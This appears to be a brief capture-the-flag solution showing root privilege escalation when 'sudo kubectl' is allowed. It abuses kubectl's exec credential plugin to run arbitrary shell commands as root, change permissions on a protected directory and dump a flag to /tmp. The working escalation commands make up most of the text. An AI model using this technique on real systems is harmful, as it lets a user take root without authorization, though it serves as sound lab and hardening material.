Since `sudo kubectl` is allowed, we need to find a way for `kubectl` to execute arbitrary commands.
Note that there are no directories with write access.

```bash
sudo kubectl config set-cluster dummy --server=https://127.0.0.1:6443
sudo kubectl config set-credentials exploit --exec-command=ash --exec-arg=-c,"chmod 500 /root/secretdirectorydonttouch/ && /root/secretdirectorydonttouch/flag > /tmp/flag" --exec-api-version=client.authentication.k8s.io/v1beta1
sudo kubectl config set-context dummy --cluster=dummy --user=exploit
sudo kubectl config use-context dummy
sudo kubectl get pods
cat /tmp/flag
```